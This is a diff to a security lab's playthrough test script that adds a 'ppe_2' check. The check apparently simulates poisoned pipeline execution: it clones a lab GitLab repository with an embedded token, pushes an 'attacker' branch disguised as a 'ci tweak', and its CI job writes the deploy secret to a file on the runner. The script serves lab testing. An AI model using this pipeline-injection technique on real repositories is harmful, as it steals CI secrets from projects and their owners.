@@ -362,6 +362,29 @@ if enabled ppe_3; then
   chk ppe_3 ppe_3-github-env-injection "$out"
 fi
 
+# --- ppe_2: push an attacker branch whose pipeline reads the unprotected secret (GitLab, shell) ----
+if enabled ppe_2; then
+  on runner 'rm -f /tmp/ppe2-proof' >/dev/null 2>&1
+  W=$(mktemp -d)
+  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/web-store.git" "$W/ws" 2>/dev/null
+  cat > "$W/ws/.gitlab-ci.yml" <<'YML'
+stages: [exfil]
+pwn:
+  stage: exfil
+  tags: [shell]
+  script:
+    - echo "$DEPLOY_SECRET" > /tmp/ppe2-proof
+YML
+  ( cd "$W/ws"
+    git -c user.email=atk@x -c user.name=atk checkout -q -B attacker
+    git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m "ci tweak"
+    git -c user.email=atk@x -c user.name=atk push -q -f origin attacker ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'for i in $(seq 1 60); do [ -s /tmp/ppe2-proof ] && break; sleep 3; done; cat /tmp/ppe2-proof 2>/dev/null')
+  chk ppe_2 ppe_2-fork-mr-secret-exfil "$out"
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
